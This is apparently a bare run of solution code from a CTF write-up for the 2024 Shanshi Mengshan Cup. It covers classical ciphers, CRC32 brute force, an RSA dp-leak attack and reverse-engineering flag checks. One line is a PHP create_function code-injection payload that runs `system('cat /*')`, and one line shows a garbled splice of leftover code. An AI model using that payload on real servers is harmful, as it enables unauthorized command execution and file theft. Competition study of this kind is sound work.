# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/2024首届“山石·蒙山杯”网络安全大赛WriteUp.md
# TITLE: 2024首届“山石·蒙山杯”网络安全大赛WriteUp
# CATEGORY: web

def caesar_decrypt(ciphertext, shift):
    decrypted_text = ""
    for char in ciphertext:
        if char.isalpha():
            shift_amount = shift % 26
            if char.islower():
                decrypted_text += chr((ord(char) - shift_amount - 97) % 26 + 97)
            else:
                decrypted_text += chr((ord(char) - shift_amount - 65) % 26 + 65)
        else:
            decrypted_text += char
    return decrypted_text

ciphertext = "eccgxj{Nywx_e_W1qtpi_Q13g}"
shift = 4
print(caesar_decrypt(ciphertext, shift))
import zlib
import itertools
import string

def brute_force_crc32(target_crc32):
    # 所有可见的ASCII字符
    visible_ascii_chars = string.printable[:-6]  # string.printable includes 100 characters, the last 6 are whitespace

    # 生成所有可能的4个字符组合
    for candidate in itertools.product(visible_ascii_chars, repeat=4):
        candidate_str = ''.join(candidate)
        candidate_crc32 = zlib.crc32(candidate_str.encode())

        # 检查CRC32是否匹配
        if candidate_crc32 == target_crc32:
            return candidate_str
    
    return None

# 目标CRC32值（例如）
target_crc32 = 0x475EDC53

# 执行爆破
result = brute_force_crc32(target_crc32)

if result:
    print(f"Found matching string: {result}")
    print(f"CRC32: {hex(zlib.crc32(result.encode()))}")
else:
    print("No matching string found.")r_decrypt(ciphertext, shift))
some_encrypt = lambda text, shift: ''.join([chr(((ord(char) - ord('A' if 'A' <= char <= 'Z' else 'a') + shift) % 26) + ord('A' if 'A' <= char <= 'Z' else 'a')) if char.isalpha() else char for char in text])

if __name__ == '__main__':
  plaintext = "Hello, Wordl!"
  shift = 4
  print("Encrypted:", some_encrypt(plaintext, shift))
?a=create_function&v=};system('cat /*');/*
import gmpy2 as gp

e  = 65537
n  = 81341453801740456556711750595393167570498597994503221907699829282377977102604445084623116531103443209109475312614340864570279365580136143868105557106203760471966244404904186019427097707682913918133188187694525599480573859216404219888072000234473884057741952626452708508336716518206503482903090272609806850687
dp = 2267875620239785100872840243404829420353764780117016215398169925234158712375753022894332259383627631211170491663842059628563952588889226976261124820132019
c  = 68743536063933676791554582156643217036584340763549551341651123137408676663330867031805776293599664745388644814744743397678920124639027237165565280318792523853633900033745253101330130605070263258464033420967992546641879680350423536048243772521159824941551114901904186100713621940034127376767770063434480692464

for x in range(1, e):
 if(e*dp%x==1):
  p=(e*dp-1)//x+1
  if(n%p!=0):
   continue
  q=n//p
  phin=(p-1)*(q-1)
  d=gp.invert(e, phin)
  m=gp.powmod(c, d, n)
  if(len(hex(m)[2:])%2==1):
   continue
  print('--------------')
  print(m)
  print(hex(m)[2:])
  print(bytes.fromhex(hex(m)[2:]))
import random
import string
dicts = string.ascii_lowercase +"{}"
    #print(dicts)

key = (''.join([random.choice(dicts) for i in range(4)])) * 8
enc='tsejk}gbxyiutfchpm}ylm}a}amuxlmg'
known='ayyctf{'

    #print(len(enc))
key=''
for i in range(4):
    key+=dicts[(ord(enc[i])-ord(known[i]))%28]
    #print(key)

key=key*8

import string

# 初始化空字典
index_dict = {}

# 使用循环将 a-z 对应到 0-25
for i, letter in enumerate(string.ascii_lowercase):
    index_dict[letter] = i

# 将 '{' 对应到 26，将 '}' 对应到 27
index_dict['{'] = 26
index_dict['}'] = 27

    #print(index_dict)

flag=''
for i in range(len(enc)):
    flag+=dicts[(index_dict.get(enc[i])-index_dict.get(key[i]))%28]

print(flag)
void *Block; // [rsp+20h] [rbp-58h] BYREF
 __int64 v3; // [rsp+28h] [rbp-50h]
unsigned char bytes_[32] = { 0xc5, 0x8f, 0xd9, 0xd8, 0xda, 0xdf, 0x8f, 0xd8, 0x8a, 0x88, 0x8a, 0xdd, 0xc5, 0x8f, 0x8f, 0xd9, 0x8a, 0x8f, 0xda, 0xda, 0xd2, 0x8f, 0xd2, 0xdd, 0x89, 0x8a, 0xde, 0xc5, 0xd9, 0xd8, 0xc5, 0xda };
for (int i = 0; i < 32; i++)
{
  unsigned char one_byte = (input[i] - 1) ^ 0xEA;
  if (one_byte != bytes_[i])
  {
    puts("try again");
    return false;
  }
}
puts("great");
bytes_ = [0xc5, 0x8f, 0xd9, 0xd8, 0xda, 0xdf, 0x8f, 0xd8, 0x8a, 0x88, 0x8a, 0xdd, 0xc5, 0x8f, 0x8f, 0xd9, 0x8a, 0x8f, 0xda, 0xda, 0xd2, 0x8f, 0xd2, 0xdd, 0x89, 0x8a, 0xde, 0xc5, 0xd9, 0xd8, 0xc5, 0xda]

flag = ""
for one_byte in bytes_:
  flag_one_char = (one_byte ^ 0xEA) + 1
  flag += chr(flag_one_char)
print(flag)
# 0f4316f3aca80ff4af119f98da504301
wchar_t edit_input[512] = { 0 }, flag[512] = { 0 };
GetWindowTextW(Edit的句柄, edit_input, 512);
sub_403D50(edit_input, output_);
if (点击次数 >= 5000)
{
 获取flag函数(flag);
 SetWindowTextW(Edit的句柄, flag);
}
if ( v22 )
    result = wcscpy_s(v2, 0x200u, L"wrong flag!");
  else
    result = wcscpy_s(v2, 0x200u, L"Congratulations!");
